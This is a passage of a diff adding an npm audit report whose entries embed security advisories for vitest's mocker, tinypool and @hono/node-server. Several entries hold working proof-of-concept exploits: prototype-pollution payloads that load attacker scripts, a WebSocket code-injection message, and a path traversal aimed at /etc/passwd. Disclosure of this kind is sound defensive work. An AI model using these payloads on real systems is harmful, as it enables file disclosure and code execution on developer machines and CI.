of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84373"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vitest",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1193684": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            ". > vitest@3.2.7 > @vitest/mocker@3.2.7"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193684,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../…/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84373"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1241260": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            ". > vitest@3.2.7 > tinypool@1.1.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/tinylibs/tinypool/security/advisories/GHSA-5gmw-xhrv-c9v3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104848\n- https://github.com/tinylibs/tinypool/pull/134\n- https://github.com/tinylibs/tinypool/commit/24df4e730e7d0857a6d226c9b58f8924227404fd\n- https://github.com/tinylibs/tinypool/releases/tag/v2.1.1\n- https://github.com/advisories/GHSA-5gmw-xhrv-c9v3",
+      "created": "2026-10-05T22:50:01.000Z",
+      "id": 1241260,
+      "npm_advisory_id": null,
+      "overview": "`tinypool` passes worker options to `new Worker()` by reading them off a plain object whose prototype is `Object.prototype`. Options the application did not set are resolved through the prototype chain and then passed explicitly to `worker_threads.Worker`.\n\nNode core ignores `Worker` options inherited from `Object.prototype`. By reading them and passing them explicitly, tinypool re-materialises them as own properties and defeats that protection.\n\n\nTwo keys reach code execution:\n\n1. **`execArgv`** — polluting `Object.prototype.execArgv = ['--require', '/path/to/attacker.js']` causes every pool worker to load the attacker's script.\n2. **`env`** — polluting `Object.prototype.env = { NODE_OPTIONS: '--require /path/to/attacker.js' }` achieves the same via environment injection.\n\n## Root cause\n\n`dist/index.js` lines 508-511:\n\n```js\nenv:            this.options.env,\nargv:           this.options.argv,\nexecArgv:       this.options.execArgv,\nresourceLimits: this.options.resourceLimits,\n```\n\n`this.options` is built at line 470 via object spread:\n\n```js\nthis.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };\n```\n\n## Impact\n\nArbitrary code execution inside every worker the pool spawns, with the privileges of the host process. Because tinypool is the worker pool behind Vitest (~42M downloads/week), the natural blast radius is developer machines and CI runners — an attacker who lands a prototype-pollution primitive anywhere in the dependency tree gets code execution in the build/test pipeline, which is a supply-chain foothold (access to CI secrets, signing keys, artifact publishing).\n\n\n## Proof of concept\n\nMinimal reproduction (3 files):\n\n**worker.mjs** — the application's own legitimate worker:\n```js\nexport default function double(n) { return n * 2 }\n```\n\n**payload.js** — attacker-controlled code (never referenced by the app):\n```js\nconst fs = require('fs')\nfs.writeFileSync('/tmp/RCE_PROOF.txt', 'code execution achieved, pid=' + process.pid)\nconsole.log('*** RCE ***')\n```\n\n**app.js** — normal tinypool usage:\n```js\nconst path = require('path')\n\n// Simulates an upstream PP source (lodash/qs/minimist/set-value/deepmerge)\nObject.prototype.execArgv = ['--require', path.join(__dirname, 'payload.js')]\n\nconst { Tinypool } = require('tinypool')\nconst pool = new Tinypool({\n  filename: path.join(__dirname, 'worker.mjs'),\n  minThreads: 1, maxThreads: 1\n})\npool.run(21).then(r => {\n  console.log('pool returned:', r)  // 42 — app works normally\n  pool.destroy()\n})\n```\n\nRun:\n```\nnpm i tinypool@2.1.0\nnode app.js\ncat /tmp/RCE_PROOF.txt   # attacker's code ran\n```\n\nBoth `execArgv` and `env` vectors confirmed on Node 20.\n\n\n## Suggested fix\n\nResolve worker options with own-property semantics:\n\n```js\nthis.options = Object.assign(Object.create(null),\n  kDefaultOptions, options, { filename, maxQueue: 0 });\n```",
+      "reported_by": null,
+      "title": "Tinypool: Prototype Pollution gadget in worker options leads to Remote Code Execution",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104848"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tinypool",
+      "vulnerable_versions": "<=2.1.0",
+      "github_advisory_id": "GHSA-5gmw-xhrv-c9v3",
+      "recommendation": "Upgrade to version 2.1.1 or later",
+      "patched_versions": ">=2.1.1",
+      "updated": "2026-10-05T22:50:02.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-5gmw-xhrv-c9v3"
+    },
+    "1241261": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            ". > vitest@3.2.7 > tinypool@1.1.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/tinylibs/tinypool/security/advisories/GHSA-85c8-ppgw-ccpr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104849\n- https://github.com/tinylibs/tinypool/pull/135\n- https://github.com/tinylibs/tinypool/commit/f41411a3e23324c674f35a19a3240f7a7c40ffbf\n- https://github.com/tinylibs/tinypool/releases/tag/v2.1.2\n- https://github.com/advisories/GHSA-85c8-ppgw-ccpr",
+      "created": "2026-10-05T22:49:52.000Z",
+      "id": 1241261,
+      "npm_advisory_id": null,
+      "overview": "`tinypool` is a fork of `piscina` and inherited the same prototype-pollution surface. When `pool.run(task, options)` is called, the `filename` option is read from the provided `options` object. If that object does not have an own `filename` property, the lookup falls through to `Object.prototype`.\n\nAn attacker who can pollute `Object.prototype.filename` (for example, via a vulnerable `lodash.merge`, `qs.parse`, or similar elsewhere in the application) can make tinypool load and execute an attacker-controlled worker module.\n\nThis is the tinypool counterpart to the piscina root discovery [GHSA-x9g3-xrwr-cwfg](https://github.com/piscinajs/piscina/security/advisories/GHSA-x9g3-xrwr-cwfg).\n\n`pool.run(task)` with no second argument is not affected, because `kDefaultOptions.filename` is `null` and the options object is not user-controlled. The exploit only triggers when the caller passes their own options object to `pool.run()`.\n\n## Impact\n\nArbitrary JavaScript execution in the worker pool. If the application passes attacker-controlled data as the `run()` task and also supplies a `run()` options object, the attacker can redirect execution to a malicious worker that exfiltrates or modifies that data, achieving remote code execution and/or data exfiltration.\n\n## Proof of Concept\n\n```js\n// legitimate-worker.mjs\nexport default async (task) => ({ by: 'legitimate-worker', processed: task })\n\n// malicious-worker.mjs\nexport default async (task) => ({ by: 'attacker', stolenRequestBody: task })\n\n// main.js\nimport express from \"express\";\nimport Tinypool from \"tinypool\";\nimport { fileURLToPath } from \"node:url\";\nimport path from \"node:path\";\n\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\n\n// Simulate upstream prototype pollution (lodash merge, qs parse, etc.)\nObject.prototype.filename = path.join(__dirname, \"malicious-worker.mjs\");\n\nconst pool = new Tinypool({\n  filename: path.join(__dirname, \"legitimate-worker.mjs\"),\n});\n\nexpress()\n  .use(express.json())\n  .post(\"/\", async (req, res) => {\n    const ac = new AbortController();\n    const result = await pool.run(req.body, { signal: ac.signal });\n    res.json(result);\n  })\n  .listen(31337);\n```\n\n## Suggested fix\n\nRead all user-supplied options from own properties only (`Object.hasOwn` or `Object.prototype.hasOwnProperty.call`) and build the internal `ThreadPool.options` object with a null prototype.",
+      "reported_by": null,
+      "title": "Tinypool: Prototype Pollution Gadget to RCE in run() options",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104849"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tinypool",
+      "vulnerable_versions": "<2.1.2",
+      "github_advisory_id": "GHSA-85c8-ppgw-ccpr",
+      "recommendation": "Upgrade to version 2.1.2 or later",
+      "patched_versions": ">=2.1.2",
+      "updated": "2026-10-05T22:49:53.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-85c8-ppgw-ccpr"
+    },
+    "1242767": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            ". > vitest@3.2.7 > @vitest/mocker@3.2.7"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-qxg6-89mg-rqv8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112949\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-qxg6-89mg-rqv8",
+      "created": "2026-10-21T19:54:26.000Z",
+      "id": 1242767,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.\n\nSame handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.\n\n### Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.\n\nProjects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.\n\n### Details\n\n`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:\n\n```ts\nexport function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '\"__vitest_mocker__\"'): string {\n  const source = `\nconst __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule(\"${moduleUrl}\");\n`\n```\n\n`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.\n\n`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:\n\n```ts\nconfigureServer(server) {\n  if (options.registerWebSocketEvents === false) { return }\n  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {\n    if (event.type === 'manual') {\n      const module = ManualMockedModule.fromJSON(event, async () => {\n        const keys = await getFactoryExports(event.url)\n        return Object.fromEntries(keys.map(key => [key, null]))\n      })\n      registry.add(module)                       // no validation of `id` or `url`\n    }\n    else {\n      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }\n```\n\n`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.\n\nWith `url = 'x\"); globalThis.ARES_INJECTED = 1; void(\"'` a request for `/src/app.js` is answered with valid, executable JavaScript:\n\n```js\nconst __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n```\n\n`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into `__factoryModule__[\"X\"]`, `export { __0 as \"X\" }` and `resolvedModule[\"X\"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.\n\n**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.\n\n### PoC\n\n`poc/mocker-manual-mock-injection/` — `repro.sh` (exit 0 = vulnerable), `poc.mjs`, `expected.txt`, `env.txt`. Everything lives under a fresh `mktemp` directory deleted on exit, the dev server binds to `127.0.0.1` on an ephemeral port, no external host is contacted, and the payload is only inspected as text — the script never evaluates it.\n\nEnvironment: commit `9e1166959e14bd32298d8a0e85352431c769ec7a`, `@vitest/mocker` 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.\n\n```bash\ngit clone https://github.com/vitest-dev/vitest && cd vitest\ngit checkout 9e1166959e14bd32298d8a0e85352431c769ec7a\npnpm install && pnpm build\nREPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.sh\n```\n\nRequired configuration — the public setup documented in `packages/mocker/EXPORTS.md`, which the harness reproduces (`mockerPlugin()` wires `interceptorPlugin` the same way):\n\n```ts\nimport { interceptorPlugin } from '@vitest/mocker/node'\nexport default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()\n```\n\nThe attack is one WebSocket message to `ws://<host>:<port>/` with subprotocol `vite-hmr`:\n\n```json\n{ \"type\": \"custom\", \"event\": \"vitest:interceptor:register\",\n  \"data\": { \"type\": \"manual\", \"raw\": \"\", \"id\": \"<abs path of a served module>\",\n            \"url\": \"x\\\"); globalThis.ARES_INJECTED = 1; void(\\\"\" } }\n```\n\nthen answering the server's `vitest:interceptor:resolve` with `{\"type\":\"custom\",\"event\":\"vitest:interceptor:resolved\",\"data\":{\"url\":\"<same url>\",\"keys\":[\"a\"]}}`. The module id can be obtained from the same socket via `vitest:mocks:resolveId` when `mockerPlugin()` is used.\n\nObserved output:\n\n```\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin http://localhost:3000  result=400\nPASS  negative control: with no mock registered the real module is served\nPASS  negative control: a mock with a harmless url replaces the module but injects nothing\n--- module served for /src/app.js ---\n    const __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n\n    let __0 = __factoryModule__[\"a\"]\n    export { __0 as \"a\" }\n    if (__factoryModule__.__factoryPromise != null) {\n      __factoryModule__.__factoryPromise.then((resolvedModule) => {\n        __0 = resolvedModule[\"a\"];\n      })\n    }\nPASS  attacker statement is present in the module the dev server serves\nPASS  the real module body was replaced\nPASS  the injected module parses as JavaScript (Vite import analysis accepted it)\n\nRESULT: VULNERABLE\n```\n\n* **Positive control** — with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.\n* **Negative control** — the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.\n* **Precondition controls** — the two `Origin` probes record the boundary honestly.\n* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with \"content contains invalid JS syntax\"), so acceptance proves the injected module is valid, executable JavaScript.\n\nReproduced three times from a clean `mktemp` fixture, exit 0 each time.\n\n### Impact\n\nCode injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only — `configureServer` does not run for `vite build` or `vite preview`.\n\n### Credits\n\n- Thai Son Dinh from VinSOC Labs (R&D)\n\nDisclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.",
+      "reported_by": null,
+      "title": "Vitest: Code injection via unauthenticated manual mock registration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112949"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0-beta.7 <4.1.12",
+      "github_advisory_id": "GHSA-qxg6-89mg-rqv8",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:54:27.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-116",
+        "CWE-306"
+      ],
+      "url": "https://github.com/advisories/GHSA-qxg6-89mg-rqv8"
+    },
+    "1243661": {
+      "findings": [
+        {
+          "version": "1.19.18",
+          "paths": [
+            "apps/worker > @hono/node-server@1.19.18",
+            "packages/mcp > @modelcontextprotocol/sdk@1.32.2 > @hono/node-server@1.19.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/node-server/security/advisories/GHSA-rmxm-3fg6-px4f\n- https://github.com/honojs/node-server/commit/982179278529d5673812116b042829f27794966f\n- https://github.com/honojs/node-server/releases/tag/v2.1.3\n- https://github.com/advisories/GHSA-rmxm-3fg6-px4f",
+      "created": "2026-10-28T21:05:00.000Z",
+      "id": 1243661,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+      "reported_by": null,
+      "title": "@hono/node-server: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118663"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@hono/node-server",
+      "vulnerable_versions": ">=1.19.10 <2.1.3",
+      "github_advisory_id": "GHSA-rmxm-3fg6-px4f",
+      "recommendation": "Upgrade to version 2.1.3 or later",
+      "patched_versions": ">=2.1.3",
+      "updated": "2026-10-28T21:05:02.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-174"
+      ],
+      "url": "https://github.com/advisories/GHSA-rmxm-3fg6-px4f"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 6,
+      "high": 2,
+      "critical": 2
+    },
+    "dependencies": 371,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 371
+  }
+}
